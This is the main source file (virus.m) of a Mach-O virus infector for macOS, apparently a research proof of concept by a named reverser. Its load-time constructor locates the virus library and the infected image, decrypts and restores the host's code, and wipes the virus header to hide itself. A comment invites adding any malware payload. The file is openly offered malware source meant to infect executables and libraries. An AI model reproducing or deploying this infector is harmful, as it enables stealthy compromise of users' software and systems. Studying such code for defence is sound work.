/*
 *        (`-.           _  .-')                .-')   ,---. 
 *     _(OO  )_        ( \( -O )              ( OO ). |   | 
 * ,--(_/   ,. \ ,-.-') ,------. ,--. ,--.   (_)---\_)|   | 
 * \   \   /(__/ |  |OO)|   /`. '|  | |  |   /    _ | |   | 
 *  \   \ /   /  |  |  \|  /  | ||  | | .-') \  :` `. |   | 
 *   \   '   /,  |  |(_/|  |_.' ||  |_|( OO ) '..`''.)|  .' 
 *    \     /__),|  |_.'|  .  '.'|  | | `-' /.-._)   \`--'  
 *     \   /   (_|  |   |  |\  \('  '-'(_.-' \       /.--.  
 *      `-'      `--'   `--' '--' `-----'     `-----' '--'  
 *
 * A mach-o virus infector
 *
 * Copyright (c) fG!, 2012,2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * virus.m
 *
 */

#import <Foundation/Foundation.h>
#include <stdlib.h>
#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_types.h>
#include <mach-o/dyld_images.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include <mach-o/dyld.h>
#include "encryption.h"
#include "restore_functions.h"
#include "structures.h"
#include "find_functions.h"
#include "wipe.h"

// our fake section to hold some data locations in the header
char data[1000] __attribute__ ((section ("__DATA, __ln_symbol_ptr")));

extern struct dyld_all_image_infos* _dyld_get_all_image_infos();
extern void init(void) __attribute__ ((constructor));

static uint32_t get_filetype(uint8_t *address);

/*
 * where all the fun starts!
 */
void init(void)
{
    printf("I'm a virus!!!\n");
    struct virus_payload_info virus_info = { 0 };
    // find the address where virus library was loaded by looking up backwards where it starts
    // this is because library name was randomized
    virus_info.virusAddress = find_library_address_randomized();
#if DEBUG
    printf("[%s] Library address %p\n", __FUNCTION__ ,(void*)virus_info.virusAddress);
#endif
    // find the name of virus library by scanning its space and retrieve LC_ID_DYLIB
    find_library_name(&virus_info);
#if DEBUG
    printf("[DEBUG] Library name is %s\n", virus_info.virusName);
#endif
    
    // find the infected image address (can be a library or main binary!)
    find_infected_image_address(&virus_info);
    virus_info.infectedFileType = get_filetype(virus_info.infectedImage);
    // get location of the encrypted payload
    find_encrypted_payload(&virus_info);

    // we need to distinguish if it's a library or the main binary
    if (virus_info.infectedFileType == MH_DYLIB) // FIXME: also MH_BUNDLE ?
    {
#if DEBUG
        printf("[%s] Target is a framework!\n", __FUNCTION__);
#endif
        // we need to find __TEXT and decrypt it
        restore_payload_library(&virus_info);
    }
    else if (virus_info.infectedFileType == MH_EXECUTE)
    {
#if DEBUG
        printf("[%s] Target is main app executable!\n", __FUNCTION__);
#endif
        restore_payload(&virus_info);
    }
    else
    {
        // ooops...
    }
    free(virus_info.virusName);
    
    // wipe library header
    wipe_header(virus_info.virusAddress);
    // add whatever malware payload you want to :-]
}

/*
 * returns the filetype from mach-o header at the given address
 */
static uint32_t
get_filetype(uint8_t *address)
{
#if DEBUG
    printf("***** [%s] start *****\n", __FUNCTION__);
#endif
    struct mach_header *mh = (struct mach_header*)address;
    uint32_t filetype = 0;
    if (mh->magic == MH_MAGIC || mh->magic == MH_MAGIC_64)
    {
        filetype = mh->filetype;
    }
    return filetype;
}

